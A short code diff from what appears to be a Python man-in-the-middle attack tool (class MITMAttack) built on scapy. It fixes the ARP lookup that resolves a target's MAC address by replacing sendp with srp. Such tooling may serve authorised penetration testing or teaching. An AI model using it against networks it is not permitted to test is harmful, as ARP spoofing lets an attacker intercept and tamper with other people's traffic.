@@ -63,7 +63,7 @@ logger = get_logger(__name__)
 
 # Import scapy
 try:
-    from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, sniff, wrpcap
+    from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp, sniff, wrpcap
 except ImportError:
     logger.error("This script requires the scapy library.")
     logger.error("Install it using: pip install scapy")
@@ -177,7 +177,7 @@ class MITMAttack:
             arp_request = ARP(pdst=ip)
             broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
             arp_request_broadcast = broadcast / arp_request
-            answered = sendp(arp_request_broadcast, iface=self.interface, timeout=2, verbose=0)[0]
+            answered, _ = srp(arp_request_broadcast, iface=self.interface, timeout=2, verbose=0)
 
             if answered:
                 return answered[0][1].hwsrc
